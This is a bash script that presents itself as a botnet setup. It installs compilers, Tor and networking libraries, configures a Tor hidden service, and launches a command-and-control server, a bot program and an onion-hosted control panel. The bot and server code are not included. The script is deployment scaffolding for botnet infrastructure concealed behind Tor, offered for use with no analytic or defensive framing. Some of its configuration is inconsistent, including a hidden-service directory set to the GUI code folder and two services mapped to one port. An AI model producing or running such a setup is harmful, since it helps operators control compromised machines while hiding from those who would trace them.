#!/bin/bash

# Exit on error
set -e

# --- Configuration ---
BOTNET_DIR="$HOME/botnet"
VENV_DIR="$BOTNET_DIR/venv"
C2_SERVER_DIR="$BOTNET_DIR/c2_server"
BOT_DIR="$BOTNET_DIR/bot"
ONION_GUI_DIR="$BOTNET_DIR/onion_gui"
REQUIREMENTS_FILE="$BOTNET_DIR/requirements.txt"

# --- Functions ---
install_dependencies() {
    echo "[*] Installing dependencies..."
    sudo apt update
    sudo apt install -y python3 python3-venv python3-pip tor git build-essential cmake libfontconfig1 libglu1-mesa-dev libgtest-dev libspdlog-dev libboost-all-dev libncurses5-dev libgdbm-dev libssl-dev libreadline-dev libffi-dev libsqlite3-dev libbz2-dev mesa-common-dev qtbase5-dev qtchooser qt5-qmake qtbase5-dev-tools libqt5websockets5 libqt5websockets5-dev qtdeclarative5-dev golang-go qtbase5-dev libqt5websockets5-dev python3-dev libboost-all-dev mingw-w64 nasm
}

setup_virtual_environment() {
    echo "[*] Setting up virtual environment..."
    python3 -m venv $VENV_DIR
    source $VENV_DIR/bin/activate
}

create_requirements_file() {
    echo "[*] Creating requirements file..."
    cat <<EOF > $REQUIREMENTS_FILE
flask
requests
beautifulsoup4
pycryptodome
scapy
netaddr
stem
psutil
opencv-python
EOF
}

install_python_packages() {
    echo "[*] Installing Python packages..."
    pip install -r $REQUIREMENTS_FILE
}

start_c2_server() {
    echo "[*] Starting C2 server..."
    cd $C2_SERVER_DIR
    python3 c2_server.py &
}

start_bot() {
    echo "[*] Starting bot..."
    cd $BOT_DIR
    python3 bot.py &
}

start_onion_gui() {
    echo "[*] Starting onion GUI..."
    cd $ONION_GUI_DIR
    python3 onion_gui.py &
}

start_tor_service() {
    echo "[*] Starting Tor service..."
    sudo systemctl enable tor
    sudo systemctl start tor
}

create_tor_hidden_service() {
    echo "[*] Creating Tor hidden service..."
    sudo tee /etc/tor/conf.d/onion-gui.conf > /dev/null <<EOF
HiddenServiceDir $ONION_GUI_DIR
HiddenServicePort 80 127.0.0.1:5000
EOF
    sudo systemctl reload tor
}

# --- Main ---
main() {
    # Create directory structure
    mkdir -p $BOTNET_DIR $VENV_DIR $C2_SERVER_DIR $BOT_DIR $ONION_GUI_DIR

    # Install dependencies
    install_dependencies

    # Set up virtual environment
    setup_virtual_environment

    # Create requirements file
    create_requirements_file

    # Install Python packages
    install_python_packages

    # Start Tor service
    start_tor_service

    # Create Tor hidden service
    create_tor_hidden_service

    # Start C2 server
    start_c2_server

    # Start bot
    start_bot

    # Start onion GUI
    start_onion_gui

    echo "[+] Botnet setup complete."
    echo "[+] C2 server is running on 0.0.0.0:5000"
    echo "[+] Onion GUI is available at http://$(sudo cat $ONION_GUI_DIR/hostname):80"
}

main